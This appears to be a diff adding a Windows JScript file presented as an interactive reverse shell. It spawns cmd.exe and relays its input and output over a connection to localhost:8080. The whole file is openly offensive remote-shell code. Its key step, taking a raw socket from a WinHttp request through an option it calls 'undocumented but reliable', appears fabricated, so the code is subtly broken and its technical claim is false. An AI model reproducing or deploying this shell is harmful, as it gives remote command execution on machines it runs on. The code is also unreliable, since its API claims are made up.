@@ -1,0 +1,73 @@
+// rev_local.jse  –  Interactive JScript reverse shell (localhost:8080)
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+    var cmd  = "cmd.exe";               // "powershell.exe" if you prefer
+
+    // ---------- 1. Open raw TCP socket ----------
+    var http = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
+    http.Open("GET", "http://" + host + ":" + port + "/", false);
+    http.SetRequestHeader("Connection", "close");
+    http.Send();                         // establishes TCP connection
+
+    // ---------- 2. Attach ADODB.Stream for raw I/O ----------
+    var inStream  = WScript.CreateObject("ADODB.Stream");
+    var outStream = WScript.CreateObject("ADODB.Stream");
+
+    inStream.Type  = 1;   // binary
+    outStream.Type = 1;   // binary
+    inStream.Open();
+    outStream.Open();
+
+    // Grab the underlying socket (undocumented but reliable)
+    var socket = http.Option(4);   // WinHttpOption_Connect_Socket
+
+    // ---------- 3. Spawn process ----------
+    var shell = WScript.CreateObject("WScript.Shell");
+    var proc  = shell.Exec(cmd);
+
+    // ---------- 4. Main pump (non-blocking) ----------
+    var buffer = new Array(2048);
+    while (true) {
+        try {
+            // ---- process → network ----
+            while (!proc.StdOut.AtEndOfStream) {
+                var data = proc.StdOut.ReadAll();
+                if (data) {
+                    outStream.Write(data);
+                    outStream.Position = 0;
+                    socket.Send(outStream.Read());
+                    outStream.Position = 0;
+                    outStream.SetEOS();
+                }
+            }
+            while (!proc.StdErr.AtEndOfStream) {
+                var data = proc.StdErr.ReadAll();
+                if (data) {
+                    outStream.Write(data);
+                    outStream.Position = 0;
+                    socket.Send(outStream.Read());
+                    outStream.Position = 0;
+                    outStream.SetEOS();
+                }
+            }
+
+            // ---- network → process ----
+            if (socket.DataAvailable) {
+                var len = socket.DataAvailable;
+                var recv = socket.Receive(len);
+                if (recv.length > 0) {
+                    proc.StdIn.Write(recv);
+                }
+            }
+
+            WScript.Sleep(50);
+        } catch (e) {
+            break;   // connection closed
+        }
+    }
+
+    // ---------- 5. Cleanup ----------
+    proc.Terminate();
+    socket.Close();
+})();
